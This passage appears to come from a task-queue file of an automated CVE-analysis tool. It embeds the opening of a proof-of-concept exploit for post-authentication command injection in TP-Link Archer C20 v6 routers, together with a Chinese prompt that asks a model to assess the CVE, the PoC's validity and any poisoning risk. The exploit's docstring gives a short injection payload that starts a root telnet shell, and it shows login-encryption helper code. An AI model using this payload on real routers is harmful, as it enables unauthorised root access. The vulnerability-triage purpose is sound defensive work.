advisory](https://www.tp-link.com/en/support/faq/5252/)\n- [CVE record](https://www.cve.org/CVERecord?id=CVE-2026-75616)\n- [NVD record](https://nvd.nist.gov/vuln/detail/CVE-2026-75616)\n\n\n---\n/tmp/56ad210147699f28495e6318642b96bb/bpa-poc.py\n---\n# Exploit Title: TP-Link Archer C20 v6 - Post-Auth Command Injection RCE (BPA)\n# Date: 2026-08-20\n# Exploit Author: Daniil Gordeev\n# Vendor Homepage: https://www.tp-link.com\n# Software Link: https://www.tp-link.com/us/support/download/archer-c20/v6/#Firmware\n# Version: Firmware <= 0.9.1 4.19 Build 251031 (fixed in EU Build 260811, US/RU Build 260812)\n# Tested on: TP-Link Archer C20 v6 (EU), Firmware 0.9.1 4.19 Build 230307, MediaTek MT7628AN (MIPS32 LE)\n# CVE: CVE-2026-75616\n# Advisory: https://www.tp-link.com/en/support/faq/5252/\n\n\"\"\"\nTP-Link Archer C20 v6 - Post-Authentication Command Injection (CVE-2026-75616)\n\nThe function oal_wan_initBpa() in libcmm.so constructs a shell command by\ninterpolating WAN_IP_CONN OID values directly into a format string passed to\nsystem() via util_execSystem():\n\n    bpalogin  user %s  password %s  authserver \"%s\"  authdomain \"%s\"\n\nThe BPA username and password fields receive zero sanitization, allowing\ncommand injection via semicolons (e.g. ;telnetd -l ash -p 4445;).\n\nThe BPA (BigPond Cable Authentication) feature is a legacy Telstra Australia\nprotocol (decommissioned ~2012) that remains compiled into TP-Link's global\nfirmware.\n\nCode path:\n  Web UI / /cgi_gdpr API\n    -> httpd OID SET\n      -> libcmm rdp_setObj\n        -> rsl_setWanIpConnObj\n          -> wan_conn_wanIpConn_handleStatusSetOpt\n            -> oal_wan_initBpa()       [on \"Connected\" transition]\n              -> util_execSystem()\n                -> system()            [ROOT]\n\nAttack requirements:\n  - Admin credentials (post-authentication)\n  - LAN access to the router's web interface\n  - WAN port connected to a DHCP-providing network\n\nPayload constraint: dm_checkString() rejects payloads >~24 chars.\nDefault payload: ;telnetd -l ash -p 4445; (24 chars, starts root telnet)\n\nExploit chain:\n  1. Login via /cgi_gdpr (RSA+AES encrypted session)\n  2. Enumerate WAN_IP_CONN instances, find or configure BPA instance\n  3. Inject shell command in X_TP_BpaUsername field\n  4. Disable competing WAN instances so BPA gets DHCP lease\n  5. Cycle BPA instance: enable -> DHCP lease -> Connected -> BpaInit -> system()\n  6. Verify root shell\n\nRequires: pycryptodome (pip3 install pycryptodome), requests\n\nUsage:\n  python3 exploit.py -t 192.168.0.1 -p <admin_password>\n  python3 exploit.py -t 192.168.0.1 -p <admin_password> -c ';telnetd -l ash -p 4445;'\n  nc 192.168.0.1 4445    # connect to root shell\n\"\"\"\n\nimport sys\nimport re\nimport os\nimport hashlib\nimport base64\nimport random\nimport time\nimport socket\nimport argparse\nimport requests\nfrom Crypto.Cipher import AES\n\nREFERER = \"http://tplinkwifi.net\"\n\n\ndef get_parm(session, base_url):\n    resp = session.get(f\"{base_url}/cgi/getParm\", headers={\"Referer\": REFERER})\n    nn = int(re.search(r'var nn=\"([^\"]+)\"', resp.text).group(1), 16)\n    ee = int(re.search(r'var ee=\"([^\"]+)\"', resp.text).group(1), 16)\n    seq = int(re.search(r'var seq=\"([^\"]+)\"', resp.text).group(1))\n    return nn, ee, seq\n\n\ndef rsa_encrypt(plaintext, e, n):\n    key_len = 64\n    max_chunk = key_len - 11\n    data = plaintext.encode()\n    result = \"\"\n    for i in range(0, len(data), max_chunk):\n        chunk = data[i:i + max_chunk]\n        pad_len = key_len - len(chunk) - 3\n        padding = bytearray()\n        while len(padding) < pad_len:\n            b = os.urandom(1)\n            if b != b'\\x00':\n                padding += b\n        padded = b'\\x00\\x02' + bytes(padding) + b'\\x00' + chunk\n        m = int.from_bytes(padded, 'big')\n        c = pow(m, e, n)\n        result += format(c, f'0{key_len * 2}x')\n    return result\n\n\ndef aes_encrypt(plaintext, key, iv):\n    cipher = AES.new(key.encode(), AES.MODE_CBC, iv.encode())\n    \n        ```\n\n    **你的角色：** 你是一名专业的网络安全分析师，擅长分析CVE漏洞信息。\n\n    **任务：**\n\n    1.  **CVE有效性：** 分析此CVE是否为真实存在的有效漏洞。请综合考虑CVE编号格式、漏洞描述的完整性、参考链接的存在、漏洞的技术细节等因素。\n    2.  **POC有效性：** 判断提供的POC代码是否有效，是否能实际利用此漏洞，并分析其有效性。\n    3.  **投毒风险：** 分析POC代码内容,判断此仓库中是否存在作者隐藏的投毒代码,分析结果使用百分比。务必不要把POC验证的后门代码判定为投毒代码。\n    4.  **利用方式：** 详细分析并总结漏洞的利用方式，包括攻击步骤、所需条件等。\n    5.  **代码分析：** 详细分析POC代码的工作原理、关键组件和执行流程。\n    6.  **排序优先级:** 搜索引擎结果 >  漏洞利用代码 > 漏洞库信息\n    7.  **输出内容:** 务必使用中文\n    8.  **markdown内容:** 务必使用markdown格式，包含以下部分：\n        - 漏洞概述\n        - 有效性分析\n        - 投毒风险分析\n        - 利用方式\n        - 代码分析\n    **输出格式：**  你**必须**严格按照以下 **JSON** 格式输出，**不要包含任何额外的文字、说明或前缀/后缀**。JSON中的**所有键和字符串类型的值必须使用双引号**。请务必对特殊字符进行转义。\n\n    **示例JSON:**```json\n    {\n        \"name\": \"CVE-2023-12345-ExampleApp-SQL注入\",\n        \"type\": \"SQL注入\",\n        \"app\": \"ExampleApp\", \n        \"risk\": \"高危，可能导致数据泄露和远程代码执行\",\n        \"version\": \"<= 1.0\",\n        \"condition\": \"需要网络访问和数据库端口开放\",\n        \"poc_available\": \"是\",\n        \"poison\": \"90%\",\n        \"cve_valid\": \"是\",\n        \"markdown\": \"# 漏洞概述\n\n该漏洞存在于ExampleApp的登录模块,攻击者可以通过构造恶意的SQL语句绕过身份验证...\n\n## 有效性分析\n\n根据CVE编号格式、漏洞描述的完整性、参考链接的存在等因素，该CVE是真实有效的...\n\n## 投毒风险分析\n\n该仓库存在较高的投毒风险，主要原因是...\n\n## 利用方式\n\n1.  攻击者需要网络访问权限\n2.  构造恶意的SQL语句\n3.  发送到目标系统\n4.  绕过身份验证，获取系统访问权限\n\n## 代码分析\n\n主要代码组件包括：\n- `exploit.py`: 主漏洞利用脚本\n- `payloads.py`: 包含各种SQL注入payload\n- `utils.py`: 辅助工具函数\n\n代码执行流程：\n1.  连接到目标数据库\n2.  构造恶意SQL语句\n3.  发送到目标系统\n4.  解析响应，获取敏感信息\n\",\n        \"repo_name\": \"example/repo\",\n        \"repo_url\": \"https://github.com/example/repo\",\n        \"cve_url\": \"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-12345\"\n    }\n        ",
     "retry_count": 0,
     "max_retries": 5,
     "priority": 2,
     "status": "pending",
     "error_type": null,
     "last_error": null,
-    "created_at": 1787429584.245851,
+    "created_at": 1787433193.617328,
     "last_attempt": 0,
-    "next_attempt": 1787429589.9018342,
+    "next_attempt": 1787433198.2845194,
     "metadata": {},
-    "task_id": "task_CVE-2026-3484_1787429584",
+    "task_id": "task_CVE-2026-75616_1787433193",
     "required_result_fields": [
       "poc_available",
       "condition",
